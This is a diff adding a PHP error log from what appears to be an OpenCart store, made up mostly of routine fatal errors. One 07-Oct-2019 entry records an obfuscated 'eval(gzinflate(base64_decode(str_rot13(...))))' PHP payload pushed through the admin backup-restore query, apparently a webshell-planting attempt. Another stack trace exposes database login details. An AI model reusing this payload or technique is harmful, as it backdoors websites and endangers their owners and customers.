@@ -1,0 +1,352 @@
+[24-Jun-2019 15:41:51 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: Could not load model extension/total/sub_total! in /home/n4j7xo9m7hs6/public_html/beta/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php:67
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/beta/admin/model/checkout/order.php(344): Loader->model('extension/total...')
+#1 /home/n4j7xo9m7hs6/public_html/beta/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php(186): ModelCheckoutOrder->addOrderHistory('16', 7, 'Order Cancelled...')
+#2 /home/n4j7xo9m7hs6/public_html/beta/system/engine/proxy.php(25): Loader->{closure}(Array, Array)
+#3 /home/n4j7xo9m7hs6/public_html/beta/vqmod/vqcache/vq2-admin_controller_sale_order.php(1950): Proxy->__call('addOrderHistory', Array)
+#4 /home/n4j7xo9m7hs6/public_html/beta/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerSaleOrder->cancel_shipping()
+#5 /home/n4j7xo9m7hs6/public_html/beta/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#6 /home/n4j7xo9m in /home/n4j7xo9m7hs6/public_html/beta/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php on line 67
+[29-Aug-2019 07:09:41 UTC] PHP Fatal error:  Uncaught Error: Class 'Loader' not found in /home/n4j7xo9m7hs6/public_html/system/framework.php:23
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_startup.php(124): require_once()
+#1 /home/n4j7xo9m7hs6/public_html/admin/index.php(23): start('admin')
+#2 {main}
+  thrown in /home/n4j7xo9m7hs6/public_html/system/framework.php on line 23
+[01-Sep-2019 11:14:51 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: Could not load model extension/total/sub_total! in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php:67
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/admin/model/checkout/order.php(344): Loader->model('extension/total...')
+#1 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php(186): ModelCheckoutOrder->addOrderHistory('27', 7, 'Order Cancelled...')
+#2 /home/n4j7xo9m7hs6/public_html/system/engine/proxy.php(25): Loader->{closure}(Array, Array)
+#3 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_sale_order.php(1950): Proxy->__call('addOrderHistory', Array)
+#4 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerSaleOrder->cancel_shipping()
+#5 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2- in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php on line 67
+[04-Sep-2019 14:14:03 Asia/Kolkata] PHP Parse error:  syntax error, unexpected 'die' (T_EXIT), expecting ',' or ';' in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_model_sale_order.php on line 762
+[04-Sep-2019 14:14:06 Asia/Kolkata] PHP Parse error:  syntax error, unexpected 'die' (T_EXIT), expecting ',' or ';' in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_model_sale_order.php on line 762
+[06-Sep-2019 11:12:03 Asia/Kolkata] PHP Warning:  unlink(/home/n4j7xo9m7hs6/public_html/system/storage/cache/cache.currency.1567748432): No such file or directory in /home/n4j7xo9m7hs6/public_html/system/library/cache/file.php on line 17
+[06-Sep-2019 22:06:25 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: Could not load model extension/total/sub_total! in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php:67
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/admin/model/checkout/order.php(344): Loader->model('extension/total...')
+#1 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php(186): ModelCheckoutOrder->addOrderHistory('38', 7, 'Order Cancelled...')
+#2 /home/n4j7xo9m7hs6/public_html/system/engine/proxy.php(25): Loader->{closure}(Array, Array)
+#3 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_sale_order.php(1950): Proxy->__call('addOrderHistory', Array)
+#4 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerSaleOrder->cancel_shipping()
+#5 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2- in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php on line 67
+[13-Sep-2019 11:39:21 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: Could not load model extension/total/sub_total! in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php:67
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/admin/model/checkout/order.php(344): Loader->model('extension/total...')
+#1 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php(186): ModelCheckoutOrder->addOrderHistory('41', 7, 'Order Cancelled...')
+#2 /home/n4j7xo9m7hs6/public_html/system/engine/proxy.php(25): Loader->{closure}(Array, Array)
+#3 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_sale_order.php(1950): Proxy->__call('addOrderHistory', Array)
+#4 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerSaleOrder->cancel_shipping()
+#5 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2- in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php on line 67
+[13-Sep-2019 12:01:55 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: Could not load model extension/total/sub_total! in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php:67
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/admin/model/checkout/order.php(344): Loader->model('extension/total...')
+#1 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php(186): ModelCheckoutOrder->addOrderHistory('31', 7, 'Order Cancelled...')
+#2 /home/n4j7xo9m7hs6/public_html/system/engine/proxy.php(25): Loader->{closure}(Array, Array)
+#3 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_sale_order.php(1950): Proxy->__call('addOrderHistory', Array)
+#4 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerSaleOrder->cancel_shipping()
+#5 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2- in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php on line 67
+[13-Sep-2019 12:37:11 Asia/Kolkata] PHP Parse error:  syntax error, unexpected '$data' (T_VARIABLE) in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_model_sale_order.php on line 662
+[19-Sep-2019 11:47:53 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: Could not load model extension/total/sub_total! in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php:67
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/admin/model/checkout/order.php(284): Loader->model('extension/total...')
+#1 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php(186): ModelCheckoutOrder->addOrderHistory('45', 2)
+#2 /home/n4j7xo9m7hs6/public_html/system/engine/proxy.php(25): Loader->{closure}(Array, Array)
+#3 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_sale_order.php(1824): Proxy->__call('addOrderHistory', Array)
+#4 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerSaleOrder->push_shipping()
+#5 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modificat in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php on line 67
+[07-Oct-2019 01:16:59 Asia/Kolkata] PHP Fatal error:  Uncaught Error: Call to undefined function zip_open() in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_extension_installer.php:119
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerExtensionInstaller->upload()
+#1 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerStartupRouter->index()
+#3 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(81): Action->execute(Object(Registry))
+#4 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(76): Front->execute(Object(Action))
+#5 /home/n4j7xo9m7hs6/public_html/system/framework.php(103): Front->dispatch(Object(Action), Object(Action))
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_startup.php(124): require_once('/home in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_extension_installer.php on line 119
+[07-Oct-2019 01:17:18 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: Table 'dikra_beta.mouwaffek_table' doesn't exist<br />Error No: 1146<br />SELECT '<?php eval (gzinflate(base64_decode(str_rot13("ML/EF8ZjRZnsUrk/hVMOJaQZS19pZ3kkVNtX06qEFgnxAct0bH2RGin/zljgT/c2q9
+/iih+BI40TaSguWq98TXxc4k0pOiufqT+K7WvibboK8kxCfTyZ6IddrWcAV5mKhyANXlg0FkNPkJ2wTHUTrlQtoJHUjjyFGycunTqKtI8lnvzPLRJ
+DT6ZEPUoIKJWkYyewYRFaJxt+epn6S0qs39+umDuTfsEJnSmd3HRWTkCv/WgX54K4g98833KBSUHXv/Ygqsr+k4USOENPRjxM/ZkaAk56eYDM0xJ5
+sK552h1khNHKr2lIXpZOhYvSs2VHZh8O8oKbPibYUutxFLYKpCY2KCo8Y7ByDy6D0l8=")))); ?>' FROM `mouwaffek_table` in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php:40
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_library_db.php(45): DB\MySQLi->query('SELECT '<?php e...', Array)
+#1 /home/n4j7xo9m7hs6/public_html/admin/model/tool/backup.php(8): DB->query('SELECT '<?php e...')
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php(186): ModelToolBackup->restore('S in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php on line 40
+[10-Oct-2019 16:20:19 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: MySQL server has gone away<br />Error No: 2006<br />SELECT DISTINCT *, (SELECT keyword FROM oc_url_alias WHERE query = 'manufacturer_id=0') AS keyword FROM oc_manufacturer WHERE manufacturer_id = '0' in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php:40
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_library_db.php(45): DB\MySQLi->query('SELECT DISTINCT...', Array)
+#1 /home/n4j7xo9m7hs6/public_html/admin/model/catalog/manufacturer.php(60): DB->query('SELECT DISTINCT...')
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php(186): ModelCatalogManufacturer->getManufacturer('0')
+#3 /home/n4j7xo9m7hs6/public_html/system/engine/proxy.php(25): Loader->{closure}(Array, Array)
+#4 /home/n4j7xo9m7hs6/public_html/admin/controller/catalog/product.php(1013): Proxy->__call('getManufacturer', Array)
+#5 /home/n4j7xo9m7hs6/public_html/admin/controller/catalog/product.php(116): Controlle in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php on line 40
+[10-Oct-2019 16:20:56 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: MySQL server has gone away<br />Error No: 2006<br />SELECT * FROM oc_setting WHERE store_id = '0' in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php:40
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_library_db.php(45): DB\MySQLi->query('SELECT * FROM o...', Array)
+#1 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/startup.php(5): DB->query('SELECT * FROM o...')
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerStartupStartup->index()
+#3 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(81): Action->execute(Object(Registry))
+#4 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(19): Front->execute(Object(Action))
+#5 /home/n4j7xo9m7hs6/public_html/system/framework.php(103): Front->dispatch(Object(Action), Object(Action))
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_s in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php on line 40
+[14-Oct-2019 11:42:54 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: Could not load model extension/total/sub_total! in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php:67
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/admin/model/checkout/order.php(344): Loader->model('extension/total...')
+#1 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php(186): ModelCheckoutOrder->addOrderHistory('63', 7, 'Order Cancelled...')
+#2 /home/n4j7xo9m7hs6/public_html/system/engine/proxy.php(25): Loader->{closure}(Array, Array)
+#3 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_sale_order.php(1950): Proxy->__call('addOrderHistory', Array)
+#4 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerSaleOrder->cancel_shipping()
+#5 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2- in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php on line 67
+[14-Oct-2019 11:42:56 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: Could not load model extension/total/sub_total! in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php:67
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/admin/model/checkout/order.php(344): Loader->model('extension/total...')
+#1 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php(186): ModelCheckoutOrder->addOrderHistory('59', 7, 'Order Cancelled...')
+#2 /home/n4j7xo9m7hs6/public_html/system/engine/proxy.php(25): Loader->{closure}(Array, Array)
+#3 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_sale_order.php(1950): Proxy->__call('addOrderHistory', Array)
+#4 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerSaleOrder->cancel_shipping()
+#5 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2- in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php on line 67
+[14-Oct-2019 16:00:22 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: Could not load model extension/total/sub_total! in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php:67
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/admin/model/checkout/order.php(284): Loader->model('extension/total...')
+#1 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php(186): ModelCheckoutOrder->addOrderHistory('62', 2)
+#2 /home/n4j7xo9m7hs6/public_html/system/engine/proxy.php(25): Loader->{closure}(Array, Array)
+#3 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_sale_order.php(1824): Proxy->__call('addOrderHistory', Array)
+#4 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerSaleOrder->push_shipping()
+#5 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modificat in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php on line 67
+[15-Oct-2019 10:27:13 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: Could not load model extension/total/sub_total! in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php:67
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/admin/model/checkout/order.php(344): Loader->model('extension/total...')
+#1 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php(186): ModelCheckoutOrder->addOrderHistory('61', 7, 'Order Cancelled...')
+#2 /home/n4j7xo9m7hs6/public_html/system/engine/proxy.php(25): Loader->{closure}(Array, Array)
+#3 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_sale_order.php(1950): Proxy->__call('addOrderHistory', Array)
+#4 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerSaleOrder->cancel_shipping()
+#5 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2- in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php on line 67
+[15-Oct-2019 17:23:58 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: MySQL server has gone away<br />Error No: 2006<br />SELECT * FROM oc_setting WHERE store_id = '0' in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php:40
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_library_db.php(45): DB\MySQLi->query('SELECT * FROM o...', Array)
+#1 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/startup.php(5): DB->query('SELECT * FROM o...')
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerStartupStartup->index()
+#3 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(81): Action->execute(Object(Registry))
+#4 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(19): Front->execute(Object(Action))
+#5 /home/n4j7xo9m7hs6/public_html/system/framework.php(103): Front->dispatch(Object(Action), Object(Action))
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_s in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php on line 40
+[15-Oct-2019 17:23:58 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: MySQL server has gone away<br />Error No: 2006<br />SELECT * FROM oc_setting WHERE store_id = '0' in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php:40
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_library_db.php(45): DB\MySQLi->query('SELECT * FROM o...', Array)
+#1 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/startup.php(5): DB->query('SELECT * FROM o...')
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerStartupStartup->index()
+#3 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(81): Action->execute(Object(Registry))
+#4 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(19): Front->execute(Object(Action))
+#5 /home/n4j7xo9m7hs6/public_html/system/framework.php(103): Front->dispatch(Object(Action), Object(Action))
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_s in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php on line 40
+[15-Oct-2019 17:24:04 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: MySQL server has gone away<br />Error No: 2006<br />SELECT * FROM oc_setting WHERE store_id = '0' in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php:40
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_library_db.php(45): DB\MySQLi->query('SELECT * FROM o...', Array)
+#1 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/startup.php(5): DB->query('SELECT * FROM o...')
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerStartupStartup->index()
+#3 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(81): Action->execute(Object(Registry))
+#4 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(19): Front->execute(Object(Action))
+#5 /home/n4j7xo9m7hs6/public_html/system/framework.php(103): Front->dispatch(Object(Action), Object(Action))
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_s in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php on line 40
+[15-Oct-2019 17:24:36 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: Could not load model extension/total/sub_total! in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php:67
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/admin/model/checkout/order.php(344): Loader->model('extension/total...')
+#1 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php(186): ModelCheckoutOrder->addOrderHistory('64', 7, 'Order Cancelled...')
+#2 /home/n4j7xo9m7hs6/public_html/system/engine/proxy.php(25): Loader->{closure}(Array, Array)
+#3 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_sale_order.php(1950): Proxy->__call('addOrderHistory', Array)
+#4 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerSaleOrder->cancel_shipping()
+#5 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/router.php(26): Action->execute(Object(Registry), Array)
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2- in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php on line 67
+[16-Oct-2019 11:42:56 UTC] PHP Warning:  mysqli::__construct(): (42000/1226): User 'dikra_shopping' has exceeded the 'max_user_connections' resource (current value: 30) in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php on line 7
+[16-Oct-2019 11:42:56 UTC] PHP Warning:  DB\MySQLi::__construct(): Couldn't fetch mysqli in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php on line 10
+[16-Oct-2019 11:42:56 UTC] PHP Warning:  DB\MySQLi::__construct(): Couldn't fetch mysqli in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php on line 10
+[16-Oct-2019 11:42:56 UTC] PHP Fatal error:  Uncaught Exception: Error: <br />Error No:  in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php:10
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_library_db.php(13): DB\MySQLi->__construct('localhost', 'dikra_shopping', 'dikra_shopping', 'dikra_beta', '3306')
+#1 /home/n4j7xo9m7hs6/public_html/system/framework.php(36): DB->__construct('mysqli', 'localhost', 'dikra_shopping', 'dikra_shopping', 'dikra_beta', '3306')
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_startup.php(124): require_once('/home/n4j7xo9m7...')
+#3 /home/n4j7xo9m7hs6/public_html/admin/index.php(23): start('admin')
+#4 {main}
+  thrown in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php on line 10
+[17-Oct-2019 10:38:34 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: MySQL server has gone away<br />Error No: 2006<br />SELECT * FROM oc_setting WHERE store_id = '0' in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php:40
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_library_db.php(45): DB\MySQLi->query('SELECT * FROM o...', Array)
+#1 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/startup.php(5): DB->query('SELECT * FROM o...')
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerStartupStartup->index()
+#3 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(81): Action->execute(Object(Registry))
+#4 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(19): Front->execute(Object(Action))
+#5 /home/n4j7xo9m7hs6/public_html/system/framework.php(103): Front->dispatch(Object(Action), Object(Action))
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_s in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php on line 40
+[17-Oct-2019 10:47:02 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: MySQL server has gone away<br />Error No: 2006<br />SELECT * FROM oc_setting WHERE store_id = '0' in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php:40
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_library_db.php(45): DB\MySQLi->query('SELECT * FROM o...', Array)
+#1 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/startup.php(5): DB->query('SELECT * FROM o...')
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerStartupStartup->index()
+#3 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(81): Action->execute(Object(Registry))
+#4 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(19): Front->execute(Object(Action))
+#5 /home/n4j7xo9m7hs6/public_html/system/framework.php(103): Front->dispatch(Object(Action), Object(Action))
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_s in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php on line 40
+[17-Oct-2019 10:47:02 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: MySQL server has gone away<br />Error No: 2006<br />SELECT * FROM oc_setting WHERE store_id = '0' in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php:40
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_library_db.php(45): DB\MySQLi->query('SELECT * FROM o...', Array)
+#1 /home/n4j7xo9m7hs6/public_html/admin/controller/startup/startup.php(5): DB->query('SELECT * FROM o...')
+#2 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerStartupStartup->index()
+#3 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(81): Action->execute(Object(Registry))
+#4 /home/n4j7xo9m7hs6/public_html/system/storage/modification/system/engine/front.php(19): Front->execute(Object(Action))
+#5 /home/n4j7xo9m7hs6/public_html/system/framework.php(103): Front->dispatch(Object(Action), Object(Action))
+#6 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_s in /home/n4j7xo9m7hs6/public_html/system/library/db/mysqli.php on line 40
+[18-Oct-2019 12:15:01 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Error: Could not load model extension/total/sub_total! in /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php:67
+Stack trace:
+#0 /home/n4j7xo9m7hs6/public_html/admin/model/checkout/order.php(344): Loader->model('extension/total...')
+#1 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_loader.php(186): ModelCheckoutOrder->addOrderHistory('68', 7, 'Order Cancelled...')
+#2 /home/n4j7xo9m7hs6/public_html/system/engine/proxy.php(25): Loader->{closure}(Array, Array)
+#3 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-admin_controller_sale_order.php(1950): Proxy->__call('addOrderHistory', Array)
+#4 /home/n4j7xo9m7hs6/public_html/vqmod/vqcache/vq2-system_storage_modification_system_engine_action.php(51): ControllerSaleOrder->cancel_shipping()
